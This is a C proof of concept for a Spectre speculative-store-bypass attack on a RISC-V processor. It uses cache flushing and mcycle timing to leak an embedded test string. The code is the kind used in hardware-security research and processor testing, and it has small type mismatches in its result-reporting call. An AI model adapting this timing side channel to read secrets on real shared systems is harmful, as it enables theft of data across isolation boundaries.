#include "../lib.c"

#include <stdio.h>
#include <stdint.h>
//#include <string.h> // For strlen()
//#include <stdlib.h> // For rand() and srand()
//#include <time.h> // For time(NULL)
#include "util_riscv.h"
#include "util_shared.h"
#include "cache.h"

// Remind: Spectre SSB  will only succeed on machines with MDP (Memory Dependence Prediction) and speculative STL forwarding.

/* >>>>>> Mostly used parameters for debugging are listed below. >>>>>> */
/*
 * 1. Variable and function names are in lower camel case, i.e. camelCase, or sneak case, i.e. sneak_case.
 * 2. (at)input, (at)inout, etc may be used for preprocessors.
 */

/**
 * The following parameters vary with machines and are obtained from experiments,
 * using "control variates method" and "binary/half-interval/logarithmic search/".
 */
//#define TRAIN_TIMES 24 // (Spectre-SSB does not need training.) Times to train the predictor. There shall be an ideal value for each machine.
// Note: smaller TRAIN_TIMES values increase misses or even cause failure, while larger ones unnecessarily take longer time.
#define ATTACK_ROUNDS 9 // used to be 3, 8, 20, originally 40 Times to attack the same index. Ideal to have larger ATTACK_ROUNDS (takes more time but statistically better).
// For most processors with simple MDP(Memory Dependence Prediction), theoretically 1 will be enough for a successful Spectre-SSB attack.
#define CACHE_HIT_THRESHOLD 37 // 37-43 will see changes. Interval smaller than CACHE_HIT_THRESHOLD will be deemed as "cache hit". Ideal to have lower CACHE_HIT_THRESHOLD (higher accuracy).
// To keep results accurate, the larger TRAIN_TIMES and ATTACK_ROUNDS you have, the smaller CACHE_HIT_THRESHOLD shoud be.

/* <<<<<< Mostly used parameters for debugging are listed above. <<<<<< */

#define SECRET_STRING "RISCV"
#define SECRET_LENGTH 5
//#define MAX_STRING_LENGTH_FACTOR 8
/**
 * Arbitrary as long as your machine allows it
 */

#define ARRAY_STRIDE L1_DCACHE_BLOCK_BYTES
/**
 * Reference from Lipp et al, 2018, Meltdown:
 * Based on the value of data in this example, a different part of the cache is accessed when executing the memory access out of order.
 * As data is multiplied by L1_DCACHE_BLOCK_BYTES (found with getconf PAGE_SIZE, typically 4096), data accesses to probe array are scattered over the array
 * with a distance of L1_DCACHE_BLOCK_BYTES Bytes (typically 4 KB, assuming an 1 B data type for probe array, e.g. uint8_t).
 * Thus, there is an injective mapping from the value of data to a memory page, i.e., different values for data never result in an access to the same page.
 * Consequently, if a cache line of a page is cached, we know the value of data.
 * The spreading over pages eliminates false positives due to the prefetcher, as the prefetcher cannot access data across page boundaries.
 * This prevents the hardware prefetcher from loading adjacent memory locations into the cache as well.
 */

/**
 * Assume the attacker knows following information in advance:
 * - Hardware specifications
 * - Control of an guideArray (address, contents, size) and an probeArray (contents, size)
 * - The start address of secretString (but no way to directly access contents of secretString)
 * - The character set of secretString and its size (such as extended ASCII which is 0~255, 8bit).
 */

/**
 * Although there are no direct accesses to secretString, after being "trained" for a certain times,
 * vulnerable processors will "grow accustomed to" legitimate inputs (such as branch-not-taken) fed deliberately by the attacker, 
 * and mistakenly predict that succeeding illegitimate attempts wll also be true, fetching secretString into cache.
 * The attacker can then exploit the shortened access time (because of cache) and apply cache SCAs methods,
 * to infer characters of secretString one by one, using brutal force (exhausting all 256 possibities of extended ASCII).
 */

#define RESULT_ARRAY_SIZE 256
/**
 * In this example program, all secret characters are in extended ASCII codes (0~255, 8bit).
 * Ofc you may change it for others like Unicode, but that will complicate everything,
 * and will also introduce REALLY high performance requirements.
 */

#define ARRAY_SIZE_FACTOR RESULT_ARRAY_SIZE
/**
 * The size of probeArray can not be smaller than the max element of guideArray.
 * Also the size of guideArray can not be smaller than "size of the probeArray divided by ARRAY_STRIDE".
 * For simplicity they are set the same in this program using ARRAY_SIZE_FACTOR.
 * (Basically there is no point in designating these parameters of guideArray separately.)
 *
 * At the same time, ARRAY_SIZE_FACTOR must be no smaller than RESULT_ARRAY_SIZE (which is further restricted by character set size),
 * and be a power of 2, e. g. legal value 512, 1024, etc. and illegal value 384.
 * For simplicity it is to set equal to RESULT_ARRAY_SIZE and has been proved to be sufficient.
 */

uint8_t guideArray[ARRAY_SIZE_FACTOR];
uint8_t probeArray[ARRAY_SIZE_FACTOR * ARRAY_STRIDE];

#include "gadget.h"

// TBD: mix the order in other ways.
#define MIXER_A 65 // min 65. 163, 167, 127, 111. Must be larger than 64.
#define MIXER_B 1 // Arbitrary as long as larger than 0.

	uint32_t mixed_i;
//	uint32_t start, diff;
	uint32_t dummy;

	// Get the highest and second highest hit values in results().
	// Each index (from 0 to RESULT_ARRAY_SIZE-1) of results() represents a character,
	// and its corresponding stored array value means cache hits.
	static uint32_t results[RESULT_ARRAY_SIZE];
	uint8_t output[2];
	uint32_t hitArray[2];

void cacheAttack(){

			register uint32_t start, diff; // Use register variables (can only be local) to reduce access time.
			// Read out probeArray and see the hit secret value.
			/* Time reads. Order is slightly mixed up to prevent stride prediction (prefetching). */
			for (int i = 0; i < ARRAY_SIZE_FACTOR; i++) {
				mixed_i = ((i * MIXER_A) + MIXER_B) & (ARRAY_SIZE_FACTOR-1);
				start = READ_CSR(mcycle);
				//There should be nothing between these 2 rows, otherwise you need to adjust the threshold. 
				dummy &= probeArray[mixed_i * ARRAY_STRIDE];
				diff = (READ_CSR(mcycle) - start);

				// Condition: interval of time is smaller than the threshold.
				if ((uint32_t)diff < CACHE_HIT_THRESHOLD){
					results[mixed_i]++; /* Cache hit */
				}
			}
}

// Memory address for displaying characters (in place of printf)
volatile char* outputAddr = (char*)0x40002000;

void resultOutput(uint32_t* resultArray, uint32_t resultArraySize, uint32_t* outIdxArray, uint8_t* outValArray){
	
	outValArray[0] = 0;
	outIdxArray[0] = 0;

	for (uint32_t i = 0; i < resultArraySize; i++){
		if (resultArray[i] > outValArray[0]){
			outIdxArray[0] = i;
			outValArray[0] = resultArray[i];
		}
	}

/*
		*outputAddr = 'V';
    	*outputAddr = 'a';
    	*outputAddr = 'l';
    	*outputAddr = 'u';
    	*outputAddr = 'e';
    	*outputAddr = ':';
    	*outputAddr = ' ';
    	*outputAddr = (char)outIdxArray[0];// + '0';//
	//	*outputAddr = x;//output[0];
        *outputAddr = ' ';
        *outputAddr = 'H';
        *outputAddr = 'i';
        *outputAddr = 't';
        *outputAddr = ':';
        *outputAddr = ' ';
        *outputAddr = (char)outValArray[0] + '0';
        *outputAddr = '\n';
*/
}

void main(){

	char* secretString = SECRET_STRING;

	uint32_t attackIdx = (uint32_t)(secretString - (char*)guideArray);

    for (int i = 0; i < sizeof(guideArray); i++){
        guideArray[i] = 1;
    }

	// Write to probeArray so in RAM not copy-on-write zero pages.
	for (int i = 0; i < sizeof(probeArray); i++){
		probeArray[i] = 1;
	}

    // Memory address for displaying characters (in place of printf)
//    volatile char* outputAddr = (char*)0x40002000;
    *outputAddr = '=';
    *outputAddr = '=';
    *outputAddr = '=';
    *outputAddr = 'S';
    *outputAddr = 't';
    *outputAddr = 'a';
    *outputAddr = 'r';
    *outputAddr = 't';
    *outputAddr = '=';
    *outputAddr = '=';
    *outputAddr = '=';
    *outputAddr = '\n';

	for(uint32_t len = 0; len < SECRET_LENGTH; len++){
	
		// Clear results for every character.
		for(uint32_t cIdx = 0; cIdx < RESULT_ARRAY_SIZE; cIdx++){
			results[cIdx] = 0;
		}

		// Run the attack on the same idx for ATTACK_ROUNDS times.
		for(uint32_t atkRound = 0; atkRound < ATTACK_ROUNDS; atkRound++){

			// Make sure array you read from is not in the cache.
//			flushCache(tempStringIndex, sizeof(tempStringIndex));
			flushCache((uint32_t)probeArray, sizeof(probeArray));

			victimFuncInit(attackIdx);
			switch (len) {
				case 0:
					victimFunc_00(attackIdx);
					break;
				case 1:
					victimFunc_01(attackIdx);
					break;
				case 2:
					victimFunc_02(attackIdx);
					break;
				case 3:
					victimFunc_03(attackIdx);
					break;
				case 4:
					victimFunc_04(attackIdx);
					break;
				//default:
				//	break;
			}
			cacheAttack();
		}

		/* Use junk so above 'dummy=' row won't get optimized out. Order of the following insturctions seems to be in a fixed position. */
		/* results[0] of static array results() will always be translated into a NULL control character in ASCII or Unicode, so don't worry. */
		/* ^ bitwise exclusive OR sets a one in each bit position where its operands have different bits, and zero where they are the same.*/
		results[0] ^= dummy;
	//	topTwoIdx(results, RESULT_ARRAY_SIZE, output, hitArray);
		resultOutput(results, RESULT_ARRAY_SIZE, output, hitArray);

		*outputAddr = 'V';
    	*outputAddr = 'a';
    	*outputAddr = 'l';
    	*outputAddr = 'u';
    	*outputAddr = 'e';
    	*outputAddr = ':';
    	*outputAddr = ' ';
    	*outputAddr = (char)output[0];// + '0';//
	//	*outputAddr = x;//output[0];
        *outputAddr = ' ';
        *outputAddr = 'H';
        *outputAddr = 'i';
        *outputAddr = 't';
        *outputAddr = ':';
        *outputAddr = ' ';
        *outputAddr = (char)hitArray[0] + '0';
        *outputAddr = '\n';

		attackIdx++;

	}

    *outputAddr = '=';
    *outputAddr = '=';
    *outputAddr = '=';
    *outputAddr = 'E';
    *outputAddr = 'n';
    *outputAddr = 'd';
    *outputAddr = '=';
    *outputAddr = '=';
    *outputAddr = '=';
    *outputAddr = '\n';

//	return 0;
}
